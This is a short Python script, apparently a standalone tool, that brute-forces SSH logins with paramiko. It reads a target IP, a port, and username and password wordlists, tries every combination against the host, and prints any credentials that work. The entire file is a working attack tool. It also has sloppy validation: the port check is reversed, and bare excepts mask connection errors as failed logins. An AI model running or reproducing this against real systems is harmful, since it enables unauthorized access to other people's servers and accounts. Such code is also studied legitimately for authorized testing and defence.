from paramiko import *
import ipaddress 
import sys

print ("""\n.dP"Y8 .dP"Y8 88  88     88""Yb 88""Yb 88   88 888888 888888 888888  dP"Yb  88""Yb  dP""b8 888888 
`Ybo." `Ybo." 88  88     88__dP 88__dP 88   88   88   88__   88__   dP   Yb 88__dP dP   `" 88__   
o.`Y8b o.`Y8b 888888     88""Yb 88"Yb  Y8   8P   88   88""   88""   Yb   dP 88"Yb  Yb      88""   
8bodP' 8bodP' 88  88     88oodP 88  Yb `YbodP'   88   888888 88      YbodP  88  Yb  YboodP 888888  \n""")


host = input ("Enter the ip >>> ")
try:
	ipaddress.IPv4Address(host) #Check if it's a valid IP
except Exception as e:
	raise e
port = int(input("Enter The port >>> "))
if port >= 65535 and port > 0:
	print("Port Should be between 1 - 655335") # Check if it's a valid port
	sys.exit()
userfile_path = input ("Path to the Users list file >>>") 
userfile = open (userfile_path)
userfile.seek(0)
userlists = []
for line in userfile :
	line = line[:-1]
	userlists.append(line)
print("Imported {} users from the user file ".format(len(userlists)))
filepass_path = input ("Path to the Password list file >>> ")
passfile = open (filepass_path)
passfile.seek(0)
passlists = []
for line in passfile :
	line = line[:-1]
	passlists.append(line)
print("Imported {} passwords from the passwords file ".format(len(passlists)))
client = SSHClient()
client.set_missing_host_key_policy(AutoAddPolicy())

for users in userlists : 
	for i in passlists :
		try:
			client.connect(host, username=users, password=i, port=port)
			print("\033[32mAuthentication Success on {} as user: {} : {}\033[0m".format(host,users,i))
			client.close()
		except:
			print('Failed Authentication on {}:{} as user: {} : {}'.format(host,port,users,i))